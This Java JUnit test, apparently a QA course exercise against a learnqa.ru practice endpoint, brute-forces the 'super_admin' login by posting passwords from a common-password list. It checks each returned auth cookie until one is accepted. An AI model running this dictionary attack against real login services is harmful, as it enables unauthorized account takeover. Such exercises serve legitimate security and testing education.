import io.restassured.RestAssured;
import io.restassured.http.Cookie;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;

public class passwordTest {

    @Test
    public void passwordTest() {

        List<String> passwords = Arrays.asList(
                "password", "123456", "123456789", "qwerty", "12345678",
                "111111", "1234567890", "1234567", "123123", "987654321",
                "qwertyuiop", "mynoob", "123321", "666666", "18atcskd2w",
                "7777777", "1q2w3e4r", "654321", "555555", "3rjs1la7qe",
                "google", "1q2w3e4r5t", "123qwe", "zxcvbnm", "1q2w3e",
                "abc123", "monkey", "letmein", "trustno1", "dragon",
                "baseball", "iloveyou", "master", "sunshine", "ashley",
                "bailey", "passw0rd", "shadow", "superman", "qazwsx",
                "michael", "Football", "jesus", "mustang", "ninja",
                "adobe123", "photoshop", "azerty", "000000", "access",
                "696969", "batman", "solo", "hottie", "loveme",
                "zaq1zaq1", "hello", "freedom", "whatever", "donald",
                "aa123456", "!@#$%^&*", "charlie", "aa123456", "password1",
                "welcome", "login", "admin", "princess", "soccer",
                "harley", "andrew", "tigger", "2000", "charlie",
                "robert", "thomas", "hockey", "ranger", "daniel",
                "starwars", "klaster", "112233", "george", "computer",
                "michelle", "jessica", "pepper", "zxcvbn", "11111111",
                "131313", "freedom", "maggie", "159753", "aaaaaa",
                "ginger", "princess", "joshua", "cheese", "amanda",
                "summer", "love", "nicole", "chelsea", "biteme",
                "matthew", "access", "yankees", "dallas", "austin",
                "thunder", "taylor", "matrix", "121212", "flower",
                "passw0rd", "freedom", "hello", "whatever", "qwerty123",
                "123qwe", "1q2w3e4r", "1q2w3e4r5t", "123qwe", "zaq1zaq1",
                "!@#$%^&*", "1234", "12345", "123456", "1234567",
                "12345678", "123456789", "1234567890", "123123", "111111",
                "000000", "121212", "7777777", "666666", "555555",
                "444444", "333333", "222222", "11111111", "1111111111",
                "987654321", "123qwe", "qwerty", "qwertyuiop", "asdfgh",
                "zxcvbn", "asdfghjkl", "password", "password1", "password123",
                "iloveyou", "sunshine", "princess", "admin", "welcome",
                "monkey", "abc123", "football", "baseball", "jordan",
                "letmein", "master", "qwertyuiop", "1234567890", "dragon",
                "superman", "harley", "michael", "mustang", "shadow",
                "ashley", "bailey", "passw0rd", "shadow", "123123",
                "654321", "superman", "qazwsx", "michael", "Football"
        );

        String login = "super_admin";
        String correctPassword=null;
        String authCookie=null;

        for (String password : passwords) {

            Map<String, Object> body = new HashMap<>();
            body.put("login", login);
            body.put("password", password);

            Response response = RestAssured
                    .given()
                    .body(body)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();


            String cookie = response.getCookie("auth_cookie");

            if (cookie != null) {

                Response checkResponse = RestAssured
                        .given()
                        .cookie("auth_cookie", cookie)
                        .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                        .andReturn();

                String responseText = checkResponse.asString();

                if (!"You are NOT authorized".equals(responseText)) {
                    correctPassword = password;
                    authCookie = cookie;
                    System.out.println("Правильный пароль: " + correctPassword);
                    System.out.println("Поздравляем: " + responseText);
                    break;
                }
            }

            System.out.println("Пароль '" + password + "' не подошел");
        }

    }
}